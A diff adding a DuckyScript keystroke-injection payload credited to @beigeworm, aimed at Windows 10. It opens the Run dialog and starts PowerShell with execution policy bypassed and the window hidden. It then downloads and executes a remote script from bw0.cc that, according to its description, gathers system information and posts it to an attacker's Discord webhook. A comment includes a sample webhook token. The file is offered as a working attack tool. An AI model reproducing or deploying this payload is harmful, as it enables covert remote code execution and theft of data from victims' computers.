@@ -1,0 +1,18 @@
+
+REM Title: beigeworm's system information to discord webhook 
+REM Author: @beigeworm
+REM Description: This script gathers system information and posts to a discord webhook address with the results.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook Channel and Token ONLY 
+eg. $dc='1206563651960586035/sNqypsq629XmXpc9TP924Dxeox6qMHDCI5e27qJ3fw4ef34wff4wf_df3aFOY' ....
+REM To hide the console, use $hide='y' below. 
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C $hide='y'; $dc='DISCORD_WEBHOOK_HERE'; iex (irm bw0.cc/dcinfo)
+ENTER
+
